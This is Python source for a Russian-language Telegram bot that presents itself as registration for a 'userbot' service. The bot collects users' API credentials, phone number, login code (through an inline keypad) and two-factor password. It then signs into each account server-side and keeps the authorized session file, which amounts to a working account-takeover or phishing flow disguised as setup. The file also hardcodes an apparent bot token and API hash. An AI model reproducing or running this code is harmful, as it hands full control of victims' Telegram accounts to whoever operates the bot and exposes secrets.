import json
import os
import asyncio
import shutil
from telethon import TelegramClient, events, Button
import logging

# Конфигурация
BOT_TOKEN = "7947709036:AAGtXtXyyn4RDDplLtGOfcNbBq5jCkCsGeE"
API_ID = "28067724"
API_HASH = "44a47c3a848f2dcafbd9c3483c4f8c5e"
USERS_FILE = "users.json"
config_file = "config.json"

# Настройка логирования
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота
bot = TelegramClient('bot_session', API_ID, API_HASH)

# Функции для работы с пользователями
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {"users": []}

def save_users(users_data):
    with open(USERS_FILE, 'w') as f:
        json.dump(users_data, f, indent=2)

def load_config(user_id):
    config_path = f"config_{user_id}.json"
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            return json.load(f)
    return {}

def save_config(user_id, config):
    config_path = f"config_{user_id}.json"
    with open(config_path, 'w') as f:
        json.dump(config, f)

# Словарь для хранения состояний пользователей
user_states = {}

# Словарь для хранения кодов подтверждения
code_collection = {}

# Словарь для хранения сообщений с кодом (чтобы можно было обновлять)
code_messages = {}

# Обработчик команды /start
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond(
        "👋 Добро пожаловать в бот регистрации UGCLAWS USERBOT Lite!\n\n"
        "Используйте /register для регистрации своего аккаунта в боте.\n"
        "После регистрации вы получите инструкции по установке и настройке бота."
    )

# Обработчик команды /register
@bot.on(events.NewMessage(pattern='/register'))
async def register_handler(event):
    sender = await event.get_sender()
    user_id = sender.id
    username = sender.username if hasattr(sender, 'username') and sender.username else f"user_{user_id}"

    # Создаем или загружаем конфиг для пользователя
    config = load_config(user_id)

    # Устанавливаем состояние пользователя
    user_states[user_id] = "waiting_for_api_id"

    # Отправляем первый шаг регистрации
    await event.respond(
        "🔑 Шаг 1: Введите ваш API ID\n"
        "(Можно получить на https://my.telegram.org/apps)"
    )

# Обработчик всех входящих сообщений для продолжения регистрации
@bot.on(events.NewMessage)
async def process_step(event):
    if event.message.text.startswith('/'):
        return  # Игнорируем команды, они обрабатываются отдельно

    sender = await event.get_sender()
    user_id = sender.id

    if user_id not in user_states:
        return  # Пользователь не находится в процессе регистрации

    state = user_states[user_id]
    config = load_config(user_id)

    if state == "waiting_for_api_id":
        api_id = event.message.text.strip()
        if not api_id.isdigit():
            await event.respond("❌ API ID должен содержать только цифры. Пожалуйста, введите корректный API ID:")
            return

        config["api_id"] = api_id
        save_config(user_id, config)
        user_states[user_id] = "waiting_for_api_hash"

        await event.respond(
            "🔑 Шаг 2: Введите ваш API Hash\n"
            "(Можно получить на https://my.telegram.org/apps вместе с API ID)"
        )

    elif state == "waiting_for_api_hash":
        api_hash = event.message.text.strip()
        config["api_hash"] = api_hash
        save_config(user_id, config)
        user_states[user_id] = "waiting_for_phone"

        await event.respond(
            "📱 Шаг 3: Введите ваш номер телефона в международном формате\n"
            "Например: +79001234567"
        )

    elif state == "waiting_for_phone":
        phone = event.message.text.strip()
        if not phone.startswith('+'):
            await event.respond("❌ Номер телефона должен начинаться с '+' и содержать код страны. Пожалуйста, введите корректный номер:")
            return

        config["phone"] = phone
        save_config(user_id, config)

        # Сохраняем пользователя как зарегистрированного
        users_data = load_users()
        if not any(user["user_id"] == user_id for user in users_data["users"]):
            users_data["users"].append({
                "user_id": user_id,
                "username": sender.username if hasattr(sender, 'username') and sender.username else f"user_{user_id}",
                "registered_at": str(event.date)
            })
            save_users(users_data)

        # Предлагаем пользователю проверить аккаунт
        user_states[user_id] = "waiting_for_test_confirmation"

        # Создаем кнопки для подтверждения
        buttons = [
            [Button.inline("Да, проверить аккаунт", b"test_yes"), 
             Button.inline("Нет, завершить", b"test_no")]
        ]

        await event.respond(
            "✅ Регистрация успешно завершена!\n\n"
            "Хотите, чтобы я проверил работоспособность вашего аккаунта?\n"
            "В этом случае мне потребуется код подтверждения и, возможно, пароль от двухфакторной аутентификации.",
            buttons=buttons
        )

    elif state == "waiting_for_2fa":
        password = event.message.text.strip()

        config = load_config(user_id)
        api_id = config.get("api_id")
        api_hash = config.get("api_hash")

        # Восстанавливаем тестовый клиент
        test_client = TelegramClient(f'test_session_{user_id}', api_id, api_hash)
        await test_client.connect()

        try:
            await test_client.sign_in(password=password)
            # Успешная авторизация с 2FA
            await test_client.disconnect()
            del user_states[user_id]

            # Копируем сессию в основную
            if os.path.exists(f'test_session_{user_id}.session'):
                try:
                    # Копируем сессию с временным именем в основное имя сессии
                    shutil.copy(f'test_session_{user_id}.session', 'session_name.session')

                    # Если есть файл журнала сессии, тоже копируем его
                    if os.path.exists(f'test_session_{user_id}.session-journal'):
                        shutil.copy(f'test_session_{user_id}.session-journal', 'session_name.session-journal')

                    await event.respond(
                        "✅ Отлично! Авторизация прошла успешно.\n"
                        "Сессия сохранена, и бот готов к работе.\n\n"
                        "Для запуска бота выполните команду: `python q/bot.py`\n"
                        "Бот автоматически подключится к вашему аккаунту!"
                    )
                except Exception as e:
                    await event.respond(
                        f"⚠️ Авторизация прошла успешно, но не удалось сохранить сессию: {e}\n\n"
                        "Для запуска бота выполните команду: `python q/bot.py`\n"
                        "При запуске бота вам может потребоваться повторно ввести код."
                    )
            else:
                await event.respond(
                    "✅ Авторизация прошла успешно, но файл сессии не найден.\n\n"
                    "Для запуска бота выполните команду: `python q/bot.py`\n"
                    "При запуске бота вам потребуется повторно ввести код."
                )

        except Exception as e:
            # Ошибка при вводе пароля 2FA
            await test_client.disconnect()
            del user_states[user_id]

            await event.respond(
                f"❌ Произошла ошибка при авторизации с паролем 2FA: {e}\n\n"
                "Попробуйте запустить бота вручную командой:\n"
                "`python q/bot.py`\n"
                "И следуйте инструкциям в консоли."
            )

# Обработчик нажатий кнопок
@bot.on(events.CallbackQuery())
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')

    # Обработка кнопок подтверждения теста
    if data.startswith("test_"):
        action = data.split("_")[1]

        if action == "yes":
            # Готовимся к тестированию аккаунта
            config = load_config(user_id)
            api_id = config.get("api_id")
            api_hash = config.get("api_hash")
            phone = config.get("phone")

            # Временный клиент для тестирования
            test_client = TelegramClient(f'test_session_{user_id}', api_id, api_hash)

            await test_client.connect()

            # Проверяем, требуется ли авторизация
            if not await test_client.is_user_authorized():
                # Запрашиваем код
                await test_client.send_code_request(phone)
                user_states[user_id] = "waiting_for_code"

                # Инициализируем пустой код для пользователя
                code_collection[user_id] = ""

                # Создаем клавиатуру с кнопками для ввода кода
                buttons = [
                    [Button.inline("1", b"code_1"), Button.inline("2", b"code_2"), Button.inline("3", b"code_3")],
                    [Button.inline("4", b"code_4"), Button.inline("5", b"code_5"), Button.inline("6", b"code_6")],
                    [Button.inline("7", b"code_7"), Button.inline("8", b"code_8"), Button.inline("9", b"code_9")],
                    [Button.inline("0", b"code_0"), Button.inline("Стереть", b"code_erase"), Button.inline("Готово", b"code_done")]
                ]

                # Отправляем сообщение с кнопками и сохраняем его для будущих обновлений
                code_messages[user_id] = await event.respond(
                    "📲 На ваш телефон отправлен код подтверждения.\n"
                    "Пожалуйста, используйте кнопки ниже для ввода кода:\n\n"
                    f"Текущий код: {code_collection.get(user_id, '')}",
                    buttons=buttons
                )
            else:
                # Уже авторизованы
                await test_client.disconnect()
                del user_states[user_id]

                await event.respond(
                    "✅ Прекрасно! Ваш аккаунт уже авторизован.\n"
                    "Для запуска бота выполните команду: `python q/bot.py`\n\n"
                    "Бот будет автоматически работать на вашем аккаунте!"
                )
        else:
            # Не хотят тестировать
            del user_states[user_id]

            await event.respond(
                "✅ Регистрация успешно завершена!\n\n"
                "Для запуска бота выполните следующие шаги:\n"
                "1. Запустите бота командой `python q/bot.py`\n"
                "2. При запросе кода из Telegram введите его через пробелы (например: 1 2 3 4 5)\n"
                "3. Если у вас включена двухфакторная аутентификация, введите пароль\n\n"
                "После этих шагов бот будет работать на вашем аккаунте!"
            )

        # Отвечаем на callback, чтобы избежать ошибки
        await event.answer()
        return

    # Обрабатываем ввод кода через кнопки
    if data.startswith("code_") and user_id in user_states and user_states[user_id] == "waiting_for_code":
        action = data.split("_")[1]

        # Получаем текущий код пользователя
        current_code = code_collection.get(user_id, "")

        if action == "erase":
            # Стираем последний символ
            if current_code:
                current_code = current_code[:-1]
        elif action == "done":
            # Код введен полностью
            if current_code and len(current_code) >= 5:
                code = current_code

                # Очищаем собранный код
                code_collection[user_id] = ""

                # Обрабатываем введенный код
                config = load_config(user_id)
                api_id = config.get("api_id")
                api_hash = config.get("api_hash")
                phone = config.get("phone")

                # Создаем тестовый клиент
                test_client = TelegramClient(f'test_session_{user_id}', api_id, api_hash)
                await test_client.connect()

                try:
                    await test_client.sign_in(phone, code)
                    # Успешная авторизация
                    await test_client.disconnect()
                    del user_states[user_id]

                    # Копируем сессию в основную
                    if os.path.exists(f'test_session_{user_id}.session'):
                        try:
                            # Копируем сессию с временным именем в основное имя сессии
                            shutil.copy(f'test_session_{user_id}.session', 'session_name.session')

                            # Если есть файл журнала сессии, тоже копируем его
                            if os.path.exists(f'test_session_{user_id}.session-journal'):
                                shutil.copy(f'test_session_{user_id}.session-journal', 'session_name.session-journal')

                            await event.respond(
                                "✅ Отлично! Авторизация прошла успешно.\n"
                                "Сессия сохранена, и бот готов к работе.\n\n"
                                "Для запуска бота выполните команду: `python q/bot.py`\n"
                                "Бот автоматически подключится к вашему аккаунту!"
                            )
                        except Exception as e:
                            await event.respond(
                                f"⚠️ Авторизация прошла успешно, но не удалось сохранить сессию: {e}\n\n"
                                "Для запуска бота выполните команду: `python q/bot.py`\n"
                                "При запуске бота вам может потребоваться повторно ввести код."
                            )
                    else:
                        await event.respond(
                            "✅ Авторизация прошла успешно, но файл сессии не найден.\n\n"
                            "Для запуска бота выполните команду: `python q/bot.py`\n"
                            "При запуске бота вам потребуется повторно ввести код."
                        )

                except Exception as e:
                    if "Two-steps verification" in str(e):
                        # Требуется двухфакторная аутентификация
                        user_states[user_id] = "waiting_for_2fa"

                        await event.respond(
                            "🔐 Требуется двухфакторная аутентификация.\n"
                            "Пожалуйста, введите пароль:"
                        )
                    else:
                        # Другая ошибка
                        await test_client.disconnect()
                        del user_states[user_id]

                        await event.respond(
                            f"❌ Произошла ошибка при авторизации: {e}\n\n"
                            "Попробуйте запустить бота вручную командой:\n"
                            "`python q/bot.py`\n"
                            "И следуйте инструкциям в консоли."
                        )

                # Отвечаем на callback, чтобы избежать ошибки
                await event.answer()
                return
            else:
                await event.answer("Введите полный код!")
                return
        else:
            # Добавляем цифру к коду
            current_code += action

        # Обновляем код в коллекции
        code_collection[user_id] = current_code

        # Обновляем сообщение с текущим кодом
        buttons = [
            [Button.inline("1", b"code_1"), Button.inline("2", b"code_2"), Button.inline("3", b"code_3")],
            [Button.inline("4", b"code_4"), Button.inline("5", b"code_5"), Button.inline("6", b"code_6")],
            [Button.inline("7", b"code_7"), Button.inline("8", b"code_8"), Button.inline("9", b"code_9")],
            [Button.inline("0", b"code_0"), Button.inline("Стереть", b"code_erase"), Button.inline("Готово", b"code_done")]
        ]

        if user_id in code_messages:
            try:
                await code_messages[user_id].edit(
                    "📲 На ваш телефон отправлен код подтверждения.\n"
                    "Пожалуйста, используйте кнопки ниже для ввода кода:\n\n"
                    f"Текущий код: {current_code}",
                    buttons=buttons
                )
            except Exception as e:
                # Если не удалось отредактировать, отправляем новое сообщение
                code_messages[user_id] = await event.respond(
                    "📲 На ваш телефон отправлен код подтверждения.\n"
                    "Пожалуйста, используйте кнопки ниже для ввода кода:\n\n"
                    f"Текущий код: {current_code}",
                    buttons=buttons
                )

        await event.answer()

# Обработчик команды /help
@bot.on(events.NewMessage(pattern='/help'))
async def help_handler(event):
    await event.respond(
        "🔮 UGCLAWS USERBOT Lite - Помощь 🔮\n\n"
        "Доступные команды:\n"
        "/start - Начать работу с ботом\n"
        "/register - Зарегистрироваться в системе\n"
        "/help - Показать это сообщение\n\n"
        "Для получения дополнительной помощи, присоединяйтесь к нашему каналу: @ugclaws_tg"
    )

# Запуск бота
async def main():
    # Проверка и создание файла пользователей, если его нет
    if not os.path.exists(USERS_FILE):
        save_users({"users": []})

    print("Бот регистрации запущен!")

    # Запускаем бота с токеном
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())